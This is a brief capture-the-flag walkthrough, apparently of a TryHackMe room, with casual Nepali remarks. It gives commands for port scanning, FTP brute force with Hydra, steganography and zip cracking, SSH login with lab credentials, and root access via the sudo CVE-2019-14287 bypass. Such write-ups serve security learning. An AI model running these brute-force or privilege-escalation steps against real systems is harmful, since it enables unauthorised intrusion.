Easy nai bhanum
suru ko enumeration ma chai time lagyo
useragent change garda garda hairan
last ma tei lekhya raixa lul

aru ta fairly ez nai bhanum

```
curl -I -A "C" http://$IP
```

summary:

```
# 1. Enumeration
nmap -p- -T4 $IP               # Full port scan
nmap -sCV -A -p21,22,80 $IP    # Service/version scan on relevant ports

# 2. Web Enumeration — hidden page via User-Agent
# (Use Burp Suite or curl)
curl -I -A "C" http://$IP      # Discover redirect hinting "chris"

# 3. FTP Brute-Force with Hydra
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://$IP

# 4. FTP Download Files
ftp $IP
prompt                         # Turn off interactive prompts
mget *
bye

# 5. Steganography & Binary Extraction
exiftool cutie.png
xxd cutie.png | tail           # peek trailing data
strings cutie.png | tail
binwalk -e cutie.png           # extract hidden files

# 6. Crack ZIP Inside PNG
cd _cutie.png.extracted
zip2john 8702.zip > ziphash
john ziphash                   # find password (→ "alien")

# 7. Extract ZIP with 7zip
7z e 8702.zip                  # enter password "alien"
cat To_agentR.txt              # reveals Base64 payload

# 8. Decode Base64 to get Stego Password
echo 'QXJlYTUx' | base64 -d     # reveals "Area51"

# 9. Use Steghide on second image
steghide extract -sf cute-alien.jpg -p Area51
# revealed credentials: james:hackerrules!

# 10. SSH into target
ssh james@$IP                  # use password "hackerrules!"
cat user.txt                   # grab user flag
w
# 11. Download imagery & OSINT
scp james@$IP:Alien_autospy.jpg ~/
# then reverse-image-search → "Roswell alien autopsy"

# 12. Privilege Escalation
ssh james@$IP
sudo -l                        # reveals (ALL, !root) /bin/bash
sudo -u#-1 /bin/bash           # exploit CVE-2019-14287
whoami                         # should output "root"
cat /root/root.txt             # grab root flag

```

privesc chai good one 